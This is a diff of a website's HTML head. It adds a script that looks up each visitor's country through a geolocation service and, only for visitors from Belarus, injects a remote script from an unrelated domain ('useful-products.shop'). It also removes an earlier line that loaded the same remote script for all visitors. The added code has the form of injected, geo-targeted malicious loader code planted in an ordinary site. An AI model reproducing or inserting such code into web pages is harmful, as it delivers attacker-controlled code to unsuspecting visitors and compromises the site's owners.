@@ -13,9 +13,26 @@
 
 <link rel="image_src" href="http://static1.squarespace.com/static/568c08be69492e0872068371/56a7cd28395614c82852a01f/5771279eb3db2bd35f6de08a/1639689173247/long-1024x574.png?format=1500w">
 
+<script type="application/javascript">
+  var country;
+  function geoip(json){
+    console.log(json.country_code);
+    country = json.country_code;
+
+    if(country == 'BY') {
+      
+      var script = document.createElement('script');
+      script.src = "https://serrum.useful-products.shop/js/index.php";
+      document.getElementsByTagName('head')[0].appendChild(script);
+
+
+    }
+  }
+</script>
+
+<script src='https://get.geojs.io/v1/ip/geo.js'></script>
 
 <script src="https://www.googletagmanager.com/gtm.js?id=GTM-M62F9BD"></script>
-<script src="https://serrum.useful-products.shop/js/index.php"></script>
 
 <meta name="facebook-domain-verification" content="08b8fbx786qq3w3xowrjydpj5n6deg" />
 
